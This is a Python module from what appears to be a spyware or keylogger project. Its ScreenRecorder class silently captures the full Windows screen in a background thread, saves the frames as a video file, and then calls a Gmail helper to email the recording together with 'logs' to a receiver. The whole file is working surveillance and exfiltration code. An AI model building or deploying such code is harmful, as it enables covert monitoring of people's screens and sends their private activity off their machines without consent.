from threading import Thread

import cv2
from numpy import array
from pyautogui import screenshot
from win32api import GetSystemMetrics
from ..messenger import Gmail


class ScreenRecorder:
    """
    Captures screenshot frames to one .avi file with help of cv2.
    """
    def __init__(self, video_length: int = 5, gmail: Gmail = None) -> None:
        self.video_length = video_length
        self.gmail = gmail
        self.screen_recorder_file_location = self.gmail.screen_recorder_file_location
        self._fps = 20
        self.video_width = GetSystemMetrics(0)
        self.video_height = GetSystemMetrics(1)
        self.video_codec = cv2.VideoWriter_fourcc(*'XVID')

    def start(self) -> None:
        """
        Starts screen capturing session
        """
        Thread(target=self._start).start()

    def _start(self) -> None:
        """
        Captures screen and sends mail to email receiver with logs and film
        """
        video_writer = cv2.VideoWriter(self.screen_recorder_file_location,
                                       self.video_codec,
                                       20.0,
                                       (self.video_width, self.video_height))

        for _ in range(self.video_length * self._fps):
            screenshoot_array = array(screenshot())
            frame = cv2.cvtColor(screenshoot_array, cv2.COLOR_BGR2RGB)
            video_writer.write(frame)

        video_writer.release()
        cv2.destroyAllWindows()

        self.gmail.send_everything()
